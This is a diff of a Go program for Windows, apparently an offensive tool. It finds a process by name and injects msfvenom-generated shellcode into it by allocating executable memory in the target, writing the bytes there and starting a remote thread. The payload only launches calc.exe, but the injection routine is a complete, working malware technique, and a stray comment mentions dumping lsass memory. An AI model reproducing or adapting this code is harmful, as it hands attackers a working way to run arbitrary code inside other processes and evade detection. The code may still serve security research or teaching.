@@ -3,19 +3,18 @@ package main
 import (
 	"fmt"
 	"os"
-	"strconv"
+	"syscall"
+	"unsafe"
 )
 
 func main() {
 
-	fmt.Println("[i] Best to execute with elevated privileges!")
-	fmt.Println("[i] Usage: appName.exe [<PID>]")
+	//
 
-	if len(os.Args) == 1 { // no arg given - list processes, and try create handles for each one
-		listAllProcesses()
-	} else if len(os.Args) == 2 { // pid given to inject into
-		pid_proc, _ := strconv.ParseUint(os.Args[1], 10, 32)
-		processPid := uint32(pid_proc)
+	if len(os.Args) != 2 { // no arg given - print usage info
+		fmt.Println("[!] Usage: appName.exe <processName>")
+	} else { // outfile defined - try dump lsass proc memory
+		procName := os.Args[1]
 
 		// Generated with: msfvenom -p windows/x64/exec CMD="calc.exe" -f go
 		buf := []byte{0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00,
@@ -43,70 +42,75 @@ func main() {
 			0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65,
 			0x78, 0x65, 0x00}
 
-		injectIntoProcessAndExecute(processPid, buf)
-	}
+		snapshot := CreateToolhelp32Snapshot(syscall.TH32CS_SNAPPROCESS, 0)
 
-}
-
-func listAllProcesses() {
-	procArrSize := 1024
-	procIdArr := make([]uint32, procArrSize)
-	var lpcbNeeded uint32 = 0
-
-	if EnumProcesses(procIdArr, 1024, &lpcbNeeded) {
-		fmt.Println("[!] Failed to read the processes. Leaving...")
-		return
-	}
-
-	fmt.Println("[+] Listing processes ids...")
-	for _, p := range procIdArr[:lpcbNeeded/4] {
-		fmt.Println(p)
-	}
-
-	fmt.Println("[+] Looking for specific process...")
-
-	var procAccess int32 = 0x1F0FFF
-	for _, p := range procIdArr[:lpcbNeeded/4] {
-
-		fmt.Println("[+] Opening process handle...")
-		var procHandle uintptr = OpenProcess(procAccess, false, p)
-		if procHandle == 0 {
-			fmt.Printf("[!] Could not open handle to process with PID: %d\n", p)
-			continue
+		if snapshot == 0 {
+			fmt.Println("[!] Could not create snapshot, aborting...")
+			return
 		}
-		fmt.Printf("[+] Obtained handle: %d for PID: %d\n", procHandle, p)
+		fmt.Printf("[+] Current Snapshot handle: %d\n", snapshot)
 
-		fileNameMaxSize := 256
-		fileNameBuff := make([]byte, fileNameMaxSize)
-
-		var resolvedProcessFileName string
-		if GetProcessImageFileNameA(procHandle, fileNameBuff, 256) {
-			resolvedProcessFileName = string(fileNameBuff[:])
-			fmt.Printf("[+] Found process fileName: %s\n", resolvedProcessFileName)
+		var proc syscall.ProcessEntry32
+		proc.Size = uint32(unsafe.Sizeof(proc))
+		err := syscall.Process32First(syscall.Handle(snapshot), &proc)
+		if err != nil {
+			fmt.Println("[!] Could not obtain first process, aborting...")
+			return
 		}
 
-		fmt.Printf("[+] Closing handle: %d\n", procHandle)
-		if !CloseHandle(procHandle) {
-			fmt.Printf("[+] Could not close process handle: %d\n", procHandle)
-		} else {
-			fmt.Printf("[+] Successfully closed process handle.\n")
+		for {
+			if syscall.UTF16ToString(proc.ExeFile[:]) == procName {
+				injectIntoProcessAndExecute(proc.ProcessID, buf)
+				fmt.Printf("[+] Done!")
+				return
+			}
+
+			if err = syscall.Process32Next(syscall.Handle(snapshot), &proc); err != nil {
+				fmt.Println("[+] Error occurred during processes enumeration, aborting...")
+				break
+			}
 		}
 	}
+
 }
 
 func injectIntoProcessAndExecute(pid uint32, buffer []byte) {
 
-	procAccess := uint32(0x001F0FFF)
+	procAccess := int32(0x001F0FFF)
 	var hRemoteProcess uintptr = OpenProcess(procAccess, false, pid)
 	if hRemoteProcess == 0 {
 		fmt.Printf("[!] Could not open handle to process with PID: %d\n", pid)
 	}
 	fmt.Printf("[+] Obtained handle: %d for PID: %d\n", hRemoteProcess, pid)
 
-	var hLocalProcess uintptr = GetCurrentProcess()
-	if hLocalProcess == 0 {
-		fmt.Printf("[!] Could not open handle to local process.\n")
-	}
-	fmt.Printf("[+] Obtained handle: %d for PID: %d\n", hLocalProcess, pid)
+	// var hLocalProcess uintptr = GetCurrentProcess()
+	// if hLocalProcess == 0 {
+	// 	fmt.Printf("[!] Could not open handle to local process.\n")
+	// }
+	// fmt.Printf("[+] Obtained handle: %d for current process.\n", hLocalProcess)
 
+	var allocMemSize uint32 = 0x1000
+	memAddr := VirtualAllocEx(hRemoteProcess, 0, allocMemSize, (0x1000 | 0x2000), syscall.PAGE_EXECUTE_READWRITE)
+	if memAddr == 0 {
+		fmt.Printf("[!] Error allocating memory in remote process - returned value: %d\n", memAddr)
+		return
+	}
+	fmt.Printf("[+] Successfully allocated memory in remote process, at addr: 0x%x\n", memAddr)
+
+	var writtenSize uintptr = 0
+	memWriteRes := WriteProcessMemory(hRemoteProcess, memAddr, buffer, uint32(len(buffer)), &writtenSize)
+	if memWriteRes == 0 {
+		fmt.Printf("[!] Error writing bytes: <%x> to address: <0x%x> in remote process. Written size: %d, Returned value: %d\n", buffer, memAddr, writtenSize, memWriteRes)
+		return
+	}
+	fmt.Printf("[+] Written %d bytes under address: 0x%x\n", writtenSize, memAddr)
+
+	hRemoteThread := CreateRemoteThread(hRemoteProcess, uintptr(0), 0, memAddr, uintptr(0), 0, uintptr(0))
+	if hRemoteThread == 0 {
+		fmt.Printf("[!] Error creating remote thread in process with PID: %d\n", pid)
+		return
+	}
+	fmt.Printf("[+] Remote thread started. Performing cleanup and leaving...\n")
+	CloseHandle(hRemoteProcess)
+	CloseHandle(hRemoteThread)
 }
